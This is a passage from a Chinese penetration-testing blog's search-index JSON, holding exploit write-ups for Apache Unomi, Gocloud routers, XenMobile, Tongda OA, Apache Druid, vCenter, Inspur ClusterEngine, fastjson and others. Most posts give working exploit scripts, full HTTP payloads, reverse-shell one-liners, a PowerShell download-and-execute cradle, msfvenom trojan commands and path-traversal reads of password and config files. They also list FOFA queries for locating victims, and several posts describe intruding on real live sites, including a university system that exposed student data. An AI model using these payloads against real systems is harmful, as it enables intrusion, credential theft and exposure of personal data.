zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-None-Match: 1611088794279Content-Length: 259&#123; &quot;filters&quot;: [&#123; &quot;id&quot;: &quot;boom&quot;, &quot;filters&quot;: [&#123; &quot;condition&quot;: &#123; &quot;parameterValues&quot;: &#123; &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(&#x27;ping 3xelvq.dnslog.cn&#x27;);&quot; &#125;, &quot;type&quot;: &quot;profilePropertyCondition&quot; &#125; &#125;] &#125;], &quot;sessionId&quot;: &quot;boom&quot;&#125; 反弹 shell，先去编码一下（http://www.jackson-t.ca/runtime-exec-payloads.html） 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vps&#x2F;3344 0&gt;&amp;1 替换 exec 内容，vps 监听，发包 成功获取一个 docker shell（直接好家伙） 附上脚本（from 团长） 1234567891011121314151617181920212223242526272829# @author Firbaskyimport requestsimport jsonMVEL_exp = &#123; &quot;filters&quot;: [ &#123; &quot;id&quot;: &quot;sample&quot;, &quot;filters&quot;: [ &#123; &quot;condition&quot;: &#123; &quot;parameterValues&quot;: &#123; &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(&#x27;ping 9309y5.dnslog.cn&#x27;);&quot; &#125;, &quot;type&quot;: &quot;profilePropertyCondition&quot; &#125; &#125; ] &#125; ], &quot;sessionId&quot;: &quot;sample&quot;&#125;url = input(&#x27;Url &gt;&gt;&gt; &#x27;)MVEL_exp = json.dumps(MVEL_exp)headers = &#123;&quot;Content-type&quot;: &quot;application/json&quot;,&quot;Accept&quot;: &quot;*/*&quot;&#125;r = requests.post(url+&quot;/context.json&quot;, data=MVEL_exp, headers=headers,verify=False)print (r.text) # 漏洞修复 升级升级","path":"2021/03/18/CVE-2020-13942-Apache-Unomi-远程代码执行漏洞/","date":"03-18","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"CVE-2020-8949 Gocloud高恪固件RCE","text":"# CVE-2020-8949 Gocloud 高恪固件 RCE # 漏洞简介 Gocloud 路由器，后台 ping 命令存在命令注入，该路由器常用于企业或者网吧 # 影响版本 GOCLOUD S2A_WL - 固件版本 4.2.7.16471 GOCLOUD S2A - 固件版本 4.2.7.17278 GOCLOUD S2A - 固件版本 4.3.0.15815 GOCLOUD S2A - 固件版本 4.3.0.17193 GOCLOUD S3A（K2P MTK 版本）- 固件版本 4.2.7.16528 GOCLOUD S3A - 固件版本 4.3.0.16572 GOCLOUD ISP3000 英特尔 ® 至强 ®E5-2660 - 固件版本 4.3.0.17190 # 漏洞复现 使用弱口令登录：admin/admin 命令注入存在的地方 bp 抓包可查看请求过程 注入 payload 123&#x2F;cgi-bin&#x2F;webui&#x2F;admin&#x2F;tools&#x2F;app_ping&#x2F;diag_ping&#x2F;;ifconfig%202%3E&amp;1;&#x2F;5&#x2F;6&#x2F;a.com_&#x2F;cgi-bin&#x2F;webui&#x2F;admin&#x2F;tools&#x2F;app_ping&#x2F;diag_ping&#x2F;;ifconfig 2&gt;&amp;1;&#x2F;5&#x2F;6&#x2F;a.com_ 执行的是 ifconfig 命令 附上 exp 脚本（来源网络）： 1234567891011121314151617181920212223242526272829303132333435# -*- coding:utf-8 -*-import requestsimport timefrom urllib.parse import quote# 执行命令EXPdef execute_command(command, TARGET): try: url = TARGET + &quot;/cgi-bin/webui&quot; timestamp = str(time.time()).split(&quot;.&quot;)[0] # 创建session request1 = requests.session() login = &#123;&quot;csrftoken&quot;: &quot;MTU5MzQ5NjI5MEdPQ0xPVUQ=&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;timestamp&quot;: &quot;1593496290&quot;, &quot;username&quot;: &quot;admin&quot;&#125; # 发送登录数据 r = request1.post(url, data=login, verify=False, timeout=10) print(r.status_code) url2 = TARGET + quote(&quot;/cgi-bin/webui/admin/tools/app_ping/diag_ping/ ;&quot; + command + &quot; 2&gt;&amp;1; /5/6/a.com_&quot;) r2 = request1.post(url2, verify=False, timeout=10) print(r2.url) print(r2.text) except Exception as e: print(e)if __name__ == &#x27;__main__&#x27;: command = &#x27;id&#x27; url = input(&quot;Url &gt;&gt;&gt; &quot;) while True: execute_command(command,url) command = input(&quot;~$: &quot;)","path":"2021/03/15/CVE-2020-8949-Gocloud高恪固件RCE/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"CVE-2020-8209 XenMobile-控制台 任意文件读取","text":"# CVE-2020-8209 XenMobile - 控制台 任意文件读取 # 漏洞简介 XenMobile 是 Citrix 开发的企业移动性管理软件。该产品允许企业管理员工的移动设备和移动应用程序。该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。 Citrix Endpoint Management 存在 任意文件读取漏洞，远程未授权攻击者通过发送特制 HTTP 请求，可以造成读取受影响设备上任意文件的影响。 # 影响版本 XenMobile Server &lt; 10.12 RP2 XenMobile Server &lt; 10.11 RP4 XenMobile Server &lt; 10.10 RP6 XenMobile Server &lt; 10.9 RP5 # 资产查找 FOFA： 1app&#x3D;&quot;XenMobile-控制台&quot; 国外站点较多 payload： 12http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;jsp&#x2F;help-sb-download.jsp?sbFileName&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdhttp:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;jsp&#x2F;help-sb-download.jsp?sbFileName&#x3D;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;sas&#x2F;sw&#x2F;config&#x2F;sftu.properties 批量检测如下：","path":"2021/03/15/CVE-2020-8209-XenMobile-控制台-任意文件读取/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"通达OA v11.7 在线任意用户登录","text":"# 通达 OA v11.7 在线任意用户登录 # 漏洞描述 需要有在线用户才能登录 # 资产查找 FOFA： 1app&#x3D;&quot;TDXK-通达OA&quot; # 漏洞复现 首先访问： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0 页面空白则表示用户在线，并且此时已经获取到了 cookie 返回显示 RELOGIN ，则不在线 若在线，则访问成功登录 uid 为 1 的用户，也就是管理员用户 exp 脚本如下（来源网络）： 1234567891011121314151617181920212223import requestsfrom bs4 import BeautifulSoupimport sysimport reurl = &quot;http://127.0.0.1/&quot;for i in range(1,600): try : vuln_url = url + &quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;+str(i)+&quot;&amp;P_VER=0&quot; resp = requests.get(vuln_url) soup = BeautifulSoup(resp.text,&#x27;html.parser&#x27;) if &#x27;RELOGIN&#x27; in soup.get_text(): print(i,&quot;不存在&quot;) else: PHPSESSION = re.findall(r&#x27;PHPSESSID=(.*?);&#x27;, str(resp.headers)) print(&#x27;uid = &#x27;+str(i)+&quot; 在线，COOKIE值是：PHPSESSID=&quot;+str(PHPSESSION[0])) print(url+&quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;+str(i)+&quot;&amp;P_VER=0&quot;) print(url+&quot;/general/&quot;) break except: print(&#x27;站点不存在漏洞!&#x27;) break 管理员用户 其他用户","path":"2021/03/15/通达OA-v11-7-在线任意用户登录/","date":"03-15","excerpt":"","tags":[{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"}]},{"title":"Apache Axis2 后台文件上传","text":"Apache Axis2 后台文件上传简介Axis是一个开源、基于XML的Web服务架构。最开始由IBM公司研发,叫IBM-SOAP。后来由Apache基金会在SOAP的基础上推出了AXIS。AXIS本质是一个Java语言编写的SOAP引擎。利用它我们可以在各种分布式应用中,让各个应用能够彼此操作、交互。 漏洞复现默认后台路径：/axis2-admin/login 默认账号密码：admin/axis2 工具下载地址： https://github.com/CaledoniaProject/AxisInvoker 访问后台地址，使用默认密码成功登录， 点击Upload Service上传aar包进行命令执行 上传工具中 build目录中的 aar 包，成功上传 命令执行windows 或 linux 均可正常执行 根据工具md文档操作如下 运行命令： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;exec?cmd&#x3D;whoami 写文件： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;write?path&#x3D;c:\\566.txt&amp;content&#x3D;123 读取文件： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;read?path&#x3D;c:\\566.txt 下载文件并将其保存 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;download?url&#x3D;http:&#x2F;&#x2F;www.baidu.com&amp;file&#x3D;c:\\123.txt","path":"2021/03/15/Apache-Axis2-后台文件上传/","date":"03-15","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"CVE-2021-25646 Apache Druid远程代码执行","text":"# CVE-2021-25646 Apache Druid 远程代码执行 # 漏洞描述 Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。 # 影响版本 Apache Druid &lt; 0.20.1 # 资产查找 FOFA： 1title&#x3D;&quot;Apache Druid&quot; # 漏洞复现 访问目录 /druid/indexer/v1/sampler ，空白页面 bp 抓包，如下 注意修改 Content-Type # payload1，ping dnslog 1234567891011121314151617181920212223242526272829303132333435363738394041POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler HTTP&#x2F;1.1Content-Type: application&#x2F;json;charset&#x3D;utf-8&#123; &quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123; &quot;type&quot;:&quot;index&quot;, &quot;ioConfig&quot;:&#123; &quot;type&quot;:&quot;index&quot;,&quot;inputSource&quot;:&#123; &quot;type&quot;:&quot;http&quot;, &quot;uris&quot;:[&quot;https:&#x2F;&#x2F;www.baidu.com&quot;] &#125;,&quot;inputFormat&quot;:&#123; &quot;type&quot;:&quot;tsv&quot;, &quot;findColumnsFromHeader&quot;:true &#125; &#125;,&quot;dataSchema&quot;:&#123; &quot;dataSource&quot;:&quot;sample&quot;, &quot;timestampSpec&quot;:&#123; &quot;column&quot;:&quot;timestamp&quot;, &quot;missingValue&quot;:&quot;2010-01-01T00:00:00Z&quot; &#125;,&quot;dimensionsSpec&quot;:&#123;&#125;, &quot;transformSpec&quot;:&#123; &quot;transforms&quot;:[], &quot;filter&quot;:&#123; &quot;type&quot;: &quot;javascript&quot;, &quot;function&quot;: &quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 ping 8bx520.dnslog.cn&#39;)&#125;&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;&quot;: &#123; &quot;enabled&quot;: &quot;true&quot; &#125; &#125; &#125; &#125;,&quot;type&quot;:&quot;index&quot;, &quot;tuningConfig&quot;:&#123; &quot;type&quot;:&quot;index&quot; &#125; &#125;,&quot;samplerConfig&quot;:&#123; &quot;numRows&quot;:50, &quot;timeoutMs&quot;:10000 &#125;&#125; 响应包 dnslog 反弹 shell，将 exec 内容改为 1&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;3344 0&gt;&amp;1 # payload2，回显 123456789101112131415161718192021222324252627&#123; &quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123; &quot;ioConfig&quot;: &#123; &quot;type&quot;: &quot;index&quot;, &quot;firehose&quot;: &#123; &quot;type&quot;: &quot;local&quot;, &quot;baseDir&quot;: &quot;&#x2F;etc&quot;, &quot;filter&quot;: &quot;passwd&quot; &#125; &#125;, &quot;dataSchema&quot;: &#123; &quot;dataSource&quot;: &quot;%%DATASOURCE%%&quot;, &quot;parser&quot;: &#123; &quot;parseSpec&quot;: &#123; &quot;format&quot;: &quot;javascript&quot;, &quot;timestampSpec&quot;: &#123;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;function&quot;: &quot;function()&#123;var s &#x3D; new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&#39;id&#39;).getInputStream()).useDelimiter(\\&quot;\\\\A\\&quot;).next();return &#123;timestamp:\\&quot;2013-09-01T12:41:27Z\\&quot;,test: s&#125;&#125;&quot;, &quot;&quot;: &#123; &quot;enabled&quot;: &quot;true&quot; &#125; &#125; &#125; &#125; &#125;&#125; 回显 id # Finally 以上仅为验证漏洞，切勿其他操作，年轻人耗子为之，造成影响与作者无关。","path":"2021/03/15/CVE-2021-25646-Apache-Druid远程代码执行/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]},{"title":"VMware vCenter Server 任意文件读取","text":"VMware vCenter Server 任意文件读取漏洞描述VMware vCenter存在任意文件读取漏洞，远程攻击者通过访问开放在外部的vCenter 控制台，可以任意读取主机上的文件。(可读取 vCenter 配置文件获得管理帐号密码)进而控制 vCenter 平台及其管理的虚拟机集群。 影响版本 VMware vCenter Server 6.5.0 a至f版 资产查找 FOFA： 1title&#x3D;&quot;ID_VC_Welcome&quot; payload： 123456windows：https:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.propertieshttps:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;C:&#x2F;windows&#x2F;win.inilinux:https:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;&#x2F;etc&#x2F;passwd 2016以上测试失败 漏洞修复升级版本","path":"2021/03/14/VMware-vCenter-Server-任意文件读取/","date":"03-14","excerpt":"","tags":[{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞","text":"锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞2021年3月8日，锐捷RG-UAC统一上网行为管理审计系统存在信息泄露漏洞，攻击者可以通过审查网页源代码获取到用户账号和密码，导致管理员用户认证信息泄露。 FOFA语法： 1title&#x3D;&quot;RG-UAC登录页面&quot; &amp;&amp; body&#x3D;&quot;admin&quot; 打开到登录页面，右键查看源码，搜索admin md5解密 输入admin用户以及破解的密码，成功登录后台 修复方式：更新系统版本","path":"2021/03/14/锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞/","date":"03-14","excerpt":"","tags":[{"name":"信息泄露","slug":"信息泄露","permalink":"https://spaceman-911.gitee.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"}]},{"title":"弱密码中发现的授权绕过","text":"# 弱密码中发现的授权绕过 某次 edu 测试中发现的，fofa 随便找一个学院的后台，发现一个前端写的不怎样的后台，看着就很 lo，直接尝试弱密码登录，直接成功登录，里面是一些招生数据 甚至还有一些学生的详细信息，如家庭地址，直接好家伙，注入我并未测试 于是尝试是否存在未授权，另一个浏览器不登录直接访问某个文件，竟然直接没有验证 啊这？不验证？那登陆的意义是啥？于是我尝试访问默认页面 default.aspx，发现 500 错误，直接猜测只验证了 default.aspx 页面，其他页面没有验证 正常成功登录如下 于是尝试登陆的时候抓包看看，抓取成功登录时的 cookie，% e7% ae% a1% e7%90%86% e5%91%98 是 url 编码，解码是 管理员 嗯？仅仅是 set 而已？那岂不是无需登录，设置 cookie 即可登录？于是我尝试不登录，直接带这个 cookie 访问 default.aspx 页面 成功来到后台 感觉是蛮重要的系统的，怎么后端就这么。。。按照这样，那应该也会存在注入啥的，由于之前提交漏洞了，现在也无法访问了也就没得再测试。 # 总结 在登陆的时候也看看返回包，尝试修改或许有收获 对比成功登录与登录失败，或许发现其中的 cookie 的不合理","path":"2021/03/11/弱密码中发现的授权绕过/","date":"03-11","excerpt":"","tags":[{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"}]},{"title":"浪潮ClusterEngine4.0集群管理系统前台RCE","text":"# 浪潮 ClusterEngine4.0 集群管理系统前台 RCE 正当我又是在摸鱼的时候，空白（ crazygod ）发来了浪潮 ClusterEngine4.0 集群管理系统前台 RCE 的 payload，嗯？那我这不得直接去复现？说干就干，fofa 一波， payload： 123POST &#x2F;loginop&#x3D;login&amp;username&#x3D;1 2\\&#39;,\\&#39;1\\&#39;\\); &#96;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F&#123;反弹shellIP&#125;%2F80%200%3E%261&#96; 找了几个站点均抓包失败，想必是修复了，一抓包就服务器连接失败，我这脾气，直接下一个，终于到了一个可以抓包的了 首先需要 vps 开启监听 nc -lvp 3344 然后开始登陆抓包，构造 payload，go post 数据包如下： 123456789101112131415POST &#x2F;login HTTP&#x2F;1.1Host: ipUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko&#x2F;20100101 Firefox&#x2F;86.0Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8X-Requested-With: XMLHttpRequestContent-Length: 103Origin: https:&#x2F;&#x2F;ipConnection: closeReferer: https:&#x2F;&#x2F;ip&#x2F;module&#x2F;login&#x2F;login.htmlCookie: lang&#x3D;cnop&#x3D;login&amp;username&#x3D;1%202\\&#39;,\\&#39;1\\&#39;\\);&#96;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F***.**.**.***%2F3344%200%3E%261&#96; 发包成功获取 root 权限 至于原理咱也不是很懂，导致命令执行，源码啥的我也没去看过，只能等空白大佬带我们分析分析了","path":"2021/03/11/浪潮ClusterEngine4-0集群管理系统前台RCE/","date":"03-11","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"一次fastjson反序列化-实战","text":"# 一次 fastjson 反序列化 - 实战 爪哇一窍不通的我，某次找到一个高校的站点 随便登录抓包，发现是 json 请求 于是尝试使用 Bp 插件 Fastjsonscan 扫描 这不是 fastjson 反序列化漏洞吗，工具梭哈，首先生成编码后的反弹 shell 生成编码后的反弹 shell（编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html） 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vpsip&#x2F;3344 0&gt;&amp;1 使用 rce 工具（ https://github.com/wyzxxz/fastjson_rce_tool ），在 vps 上运行 rce 工具 1java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections5 &quot;编码后的bash&quot; 再开启一个终端 vps 监听 3344 端口，bp 改包发送数据 1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;vps:1099&#x2F;Object&quot;,&quot;autoCommit&quot;:true&#125; 成功反弹 shell # 总结 原理或许不知道，但是可以尝试工具梭哈，脚本小子就是我 多看大佬的文章，最新的漏洞，在实战时有很大的帮助","path":"2021/02/23/一次fastjson反序列化-实战/","date":"02-23","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"从一次文件下载到getshell","text":"# 从一次文件下载到 getshell 由于没有实战过任意文件下载，于是去 gogo 了一下，发现一个任意文件下的地址： http://www.xxx.cn/down.php?file=download/xxxx.pdf 随便输入一个文件看看 好家伙，bt 默认不开启这个，但是通过这个报错我们也知道路径了，于是就下载一个 index.php 通过这个文件，找到了其他的文件，重要的文件不就是数据库配置文件吗 下载这个配置，得到后台地址和数据库登录信息等 直接尝试连接（ip 直接 whois 查询），进入 admin 表，直接好家伙，密码还是明文 通过刚刚得到的后台地址，直接进行登录 产品配置发现一个上传点，直接选择添加，直接上传 php 文件，直接被过滤，说是非图片类型，难道是 mime 检测而已？直接尝试修改 Content-Type 头，成功上传 右键查看图片，getshell # 总结 有下载的地方尝试或许有惊喜 读读源码，前端漂亮的站点，有时候后台没做到位 摸鱼完了，又水了一篇，有时候不能想太多，但需要多多尝试，但要适而可止","path":"2021/02/23/从一次文件下载到getshell/","date":"02-23","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"MSF+FRP实现远程渗透","text":"# MSF-FRP 实现远程渗透 首先下载 frp 工具（https://github.com/fatedier/frp/releases），放至 vps 和 kali，我的 vps 是 centos7，所以我选择的是 frp_0.35.1_linux_386.tar.gz ，若不了解自己 vps 的体系结构可参考 linux 系统的体系结构：https://blog.csdn.net/lixuande19871015/article/details/90485929 frp 支持的 linux 的架构 ：https://blog.csdn.net/lixuande19871015/article/details/98613711 # 0x01 vps 服务端的配置 下载 frp 解压至 vps ，编辑 frps.ini 文件，编辑时请勿带注释 12345678[common]bind_addr &#x3D; 0.0.0.0bind_port &#x3D; 6531 #frp连接端口dashboard_addr &#x3D; 0.0.0.0dashboard_port &#x3D; 7500 #网页访问端口dashboard_user &#x3D; admin #用户名dashboard_pwd &#x3D; password #密码token &#x3D; spaceman #frp连接口令 完成配置，启动服务端 前台启动： ./frps -c frps.ini 后台启动： nohup ./frps -c frps.ini &gt; log.txt &amp; 可登录图形化界面 ip:7500，记得防火墙开启这几个端口 # 0x02 kali 客户端的配置 下载 frp 解压至 kali，编辑 frpc.ini 文件 123456789[common]server_addr &#x3D; 81.xx.xx.xx #vps的ipserver_port &#x3D; 6531 #连接frp的端口token &#x3D; spaceman #连接frp的口令[msf]type &#x3D; tcp #连接协议local_ip &#x3D; 127.0.0.1 #本地iplocal_port &#x3D; 6759 #本地转发vps端口remote_port &#x3D; 6000 #访问端口，也是木马的端口 启动 frpc， ./frps -c frps.ini vps 连接成功 kali 连接成功 木马制作 1msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;vps LPORT&#x3D;6000 -e x86&#x2F;shikata_ga_nai -b &#39;\\x00\\x0a\\xff&#39; -i 15 -f exe -o shell.exe msf 设置监听 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 127.0.0.1set lport 6759run 远程小伙伴运行木马测试，成功","path":"2021/02/15/MSF-FRP实现远程渗透/","date":"02-15","excerpt":"","tags":[{"name":"MSF","slug":"MSF","permalink":"https://spaceman-911.gitee.io/tags/MSF/"}]},{"title":"CVE-2017-8464远程命令执行漏洞复现","text":"# CVE-2017-8464 远程命令执行漏洞复现 # 漏洞描述 2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危 Windows 系统通过解析 .LNK 后缀文件时，是使用二进制来解析的，而当恶意的二进制代码被系统识别执行的时候就可以实现远程代码执行，由于是在 explorer.exe 进程中运行的，所以 load 进内存的时候与当前用户具有相同的权限。 于是攻击者利用这一解析过程的漏洞，将包含恶意二进制的代码被附带进可移动驱动器 (或远程共享过程中)，受害者使用 powershell 解析 .LNK 文件后就会被黑客所控制。 成功利用此漏洞的攻击者可能会获得与本地用户相同的用户权限。 # 影响版本 123456789windows 7windows 8windows 8.1windows 10windows server 2008windows server 2008 R2windows server 2012windows server 2012 R2windows server 2016 # 环境准备 攻击机：kali IP：192.168.30.154 靶机：Windows 7 X64 IP：192.168.30.153 # 漏洞复现 使用 kali msfvenom 生成一个反弹 shell 1root@kali911:~# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.30.154 LPORT&#x3D;5656 -f psh-reflection&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;hack.ps1 这里生成至 /var/www/html 目录下 启动 Apache 服务 12root@kali911:~# service apache2 restart root@kali911:~# service apache2 status 浏览器打开该文件，查看是否成功 1http:&#x2F;&#x2F;127.0.0.1&#x2F;hack.ps1 启动 msf 1root@kali911:~# msfconsole 使用监听模块 multi/handler 1msf5 &gt; use exploit&#x2F;multi&#x2F;handler 指定 kali 攻击机 IP 1msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.30.154 设置端口 1msf5 exploit(multi&#x2F;handler) &gt; set LPORT 5656 设置返回载荷 1msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp 靶机创建快捷键（桌面右键 -&gt; 新建 -&gt; 快捷方式），输入以下内容 1powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.30.154&#x2F;hack.ps1&#39;);test.ps1&quot; 完成创建，运行快捷方式，一闪而过 回到 kali ，开始攻击 1msf5 exploit(multi&#x2F;handler) &gt; exploit 查看系统信息 1meterpreter &gt; sysinfo 对屏幕进行截图 1meterpreter &gt; screenshot 还可进行更多操作这里就不一一介绍了 登录 shell 1meterpreter &gt; shell 查看当前用户 1C:\\Windows\\System32\\WindowsPowerShell\\v1.0&gt;whoami","path":"2021/02/11/CVE-2017-8464远程命令执行漏洞复现/","date":"02-11","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]},{"title":"CVE-2019-11043漏洞复现","text":"# CVE-2019-11043 漏洞复现 # 0x01 漏洞简介 nginx + php-fpm 配置不当，当 nginx 配置文件中有 fastcgi_split_path_info ，却没有 if(!-f $document_root$fastcgi_script_name)&#123;return 404;&#125; 的时候就会导致远程代码执行。 向 Nginx + PHP-FPM 的服务器 URL 发送 %0a 时，服务器返回异常。 该漏洞需要在 nginx.conf 中进行特定配置才能触发。具体配置如下： 1234567location ~ [^&#x2F;]\\.php(&#x2F;|$) &#123;...fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$;fastcgi_param PATH_INFO $fastcgi_path_info;fastcgi_pass php:9000;...&#125; 攻击者可以使用换行符（％0a）来破坏 fastcgi_split_path_info 指令中的 Regexp。 Regexp 被损坏导致 PATH_INFO 为空，从而触发该漏洞。 影响版本： PHP 7.0 版本 PHP 7.1 版本 PHP 7.2 版本 PHP 7.3 版本 修复建议： PHP 7.1.X 更新至 7.1.33 PHP 7.2.X 更新至 7.2.24 PHP 7.3.X 更新至 7.3.11 # 0x02 环境搭建 系统：kali # 安装 docker、golang 环境 12sudo apt-get install docker docker-composesudo apt install golang # 搭建环境 12git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.gitcd vulhub&#x2F;php&#x2F;CVE-2019-11043 &amp;&amp; docker-compose up -d 查看 docker 环境： 访问 8080 端口，成功如下 # 0x03 漏洞利用 # 安装漏洞利用工具 1234git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.gitcd phuip-fpizdamgo env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cngo get -v &amp;&amp; go build 默认使用的是 proxy.golang.org，在国内无法访问，所以换了一个国内能访问的代理地址：https://goproxy.cn # 工具攻击 1.&#x2F;phuip-fpizdam http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php 成功利用，参数名为 a # 0x04 参考链接： https://blog.csdn.net/weixin_43606134/article/details/107646467 https://blog.csdn.net/qq_43342566/article/details/102733144 http://blog.leanote.com/post/snowming/9da184ef24bd https://blog.csdn.net/weixin_40412037/article/details/111225967","path":"2021/02/10/CVE-2019-11043漏洞复现/","date":"02-10","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]}],"categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://spaceman-911.gitee.io/tags/PHP/"},{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"提权","slug":"提权","permalink":"https://spaceman-911.gitee.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CNVD","slug":"CNVD","permalink":"https://spaceman-911.gitee.io/tags/CNVD/"},{"name":"任意文件读取","slug":"